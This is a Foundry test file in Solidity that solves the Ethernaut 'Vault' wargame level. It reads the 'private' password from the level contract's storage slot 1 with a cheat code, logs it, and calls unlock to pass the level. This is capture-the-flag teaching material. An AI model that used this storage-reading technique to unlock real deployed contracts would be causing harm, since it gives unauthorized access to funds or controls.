pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Vault/Vault.sol";
import "../Vault/VaultFactory.sol";
import "../Ethernaut.sol";

interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called 
  function startPrank(address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
  // Loads a storage slot from an address
  function load(address account, bytes32 slot) external returns (bytes32);
}

contract VaultTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    VaultFactory vaultFactory;
    address levelAddress;
    bool levelSuccessfullyPassed;

    function setUp() public {
        // Setup instances of the Ethernaut & VaultFactory contracts
        ethernaut = new Ethernaut();
        vaultFactory = new VaultFactory();
    }

    function testVaultHack() public {

        // Register the Ethernaut Vault level (this would have already been done on Rinkeby)
        ethernaut.registerLevel(vaultFactory);

        // Add some ETH to the 0 address which we will be using 
        payable(address(0)).transfer(1 ether);
        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
        cheats.startPrank(address(0));

        // Set up the Level
        levelAddress = ethernaut.createLevelInstance(vaultFactory);

        // Cast the level address to the Vault contract class
        Vault ethernautVault = Vault(payable(levelAddress));

        // Cheat code to load contract storage at specific slot
        bytes32 password = cheats.load(levelAddress, bytes32(uint256(1)));
        // Log bytes stored at that memory location
        emit log_bytes(abi.encodePacked(password)); 


        // The following lines just convert from bytes32 to a string and logs it so you can see that the password we have obtained is correct
        uint8 i = 0;
        while(i < 32 && password[i] != 0) {
            i++;
        }
        bytes memory bytesArray = new bytes(i);
        for (i = 0; i < 32 && password[i] != 0; i++) {
            bytesArray[i] = password[i];
        }
        emit log_string(string(bytesArray));

        // Call the unlock function with the password we read from storage
        ethernautVault.unlock(password);

        // Submit level to the core Ethernaut contract
        levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));

        // Stop the prank - calls with no longer come from address(0) 
        cheats.stopPrank();

        // Verify the level has passed
        assert(levelSuccessfullyPassed);
    }
}